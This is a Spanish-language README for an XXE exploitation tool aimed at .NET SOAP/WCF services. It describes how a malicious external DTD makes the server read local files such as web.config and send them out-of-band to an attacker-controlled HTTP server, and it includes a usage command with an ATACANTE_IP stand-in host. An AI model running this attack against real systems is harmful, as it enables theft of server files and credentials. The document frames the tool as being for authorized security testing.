# SOAP / WCF XXE - Out-of-Band File Disclosure (.NET)

## Descripcion

Desarrolle esta herramienta para explotar una inyeccion de entidades externas
(XXE) en un servicio SOAP/WCF de .NET (por ejemplo un endpoint MDT
MonitorEvent). Cuando el parser XML del servicio resuelve entidades externas y
no las tiene deshabilitadas, se puede inyectar un `DOCTYPE` que apunta a una DTD
externa que yo controlo. Con parameter entities, leo un archivo del servidor y
lo exfiltro out-of-band (OOB) hacia mi propio server HTTP, incluso cuando la
respuesta del servicio no refleja el contenido (XXE ciego).

## Componentes

- **soap-xxe-oob.py** - levanta el server HTTP que sirve la DTD maliciosa y
  captura la exfiltracion, y envia la request SOAP con el `DOCTYPE` inyectado
- **evil.dtd** - plantilla de la DTD externa (el script la genera y la sirve
  automaticamente; se incluye como referencia)

## Como funciona

1. **DTD externa**: Sirvo una DTD con parameter entities: una entidad `%file`
   que lee el archivo objetivo y una `%exfil` que lo adjunta como parametro de
   una URL hacia mi server
2. **Inyeccion del DOCTYPE**: Mando una request SOAP cuyo `DOCTYPE` apunta a mi
   DTD externa
3. **Resolucion**: El parser del servicio descarga mi DTD, lee el archivo local
   y hace un GET a mi server con el contenido en la query string
4. **Captura OOB**: Mi server recibe el GET `/LEAK?d=...` y me muestra el archivo
   exfiltrado

## Requisitos

```bash
pip install requests
```

## Uso

```bash
python3 soap-xxe-oob.py \
    --target http://TARGET:9800/MDTMonitorEvent/ \
    --lhost ATACANTE_IP --lport 8000 \
    --file "file:///C:/Windows/System32/drivers/etc/hosts"
```

Para leer otros archivos, cambia `--file` (por ejemplo
`file:///C:/inetpub/wwwroot/web.config`). Con `--soap-ns 11` se usa SOAP 1.1.

## Detalles tecnicos

- **Vector**: `DOCTYPE` con DTD externa en el body SOAP de un servicio WCF/.NET
- **Tecnica**: parameter entities para XXE ciego con exfiltracion OOB via HTTP
- **Causa raiz**: parser XML que resuelve entidades externas sin restringirlas
- **Impacto**: lectura arbitraria de archivos del servidor (credenciales,
  configs, etc.)

## Aviso legal

Esta herramienta es unicamente para pruebas de seguridad autorizadas y fines
educativos. Obtene siempre autorizacion por escrito antes de testear contra
cualquier sistema.
